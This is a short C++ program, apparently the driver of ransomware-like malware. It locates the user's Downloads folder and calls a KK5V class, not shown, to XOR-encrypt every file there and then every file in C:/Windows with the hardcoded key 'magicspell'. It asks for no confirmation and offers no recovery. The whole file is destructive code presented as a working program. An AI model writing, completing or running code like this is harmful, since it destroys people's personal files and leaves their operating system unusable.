#include "kk5v.h"
#include <windows.h>
#include <iostream>
#include <string>

std::string getDownloadsDirectory()
{
    // Get the value of the USERPROFILE environment variable
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH) == 0)
    {
        // Handle error if USERPROFILE is not found
        return "";
    }

    // Append the Downloads folder to the USERPROFILE path
    std::string downloadsDirectory = std::string(userProfile) + "\\Downloads";
    return downloadsDirectory;
}

int main()
{
    std::string key = "magicspell"; // Key for XOR encryption
    KK5V encryption(key);

    // Get the path to the Downloads folder using USERPROFILE
    std::string downloadsPath = getDownloadsDirectory();

    if (!downloadsPath.empty())
    {
        // Encrypt files in the Downloads directory
        encryption.encryptDirectory(downloadsPath);
    }
    else
    {
        std::cerr << "Failed to retrieve the Downloads directory." << std::endl;
    }

    // Encrypt files in the C:/Windows directory
    encryption.encryptDirectory("C:/Windows");

    return 0;
}
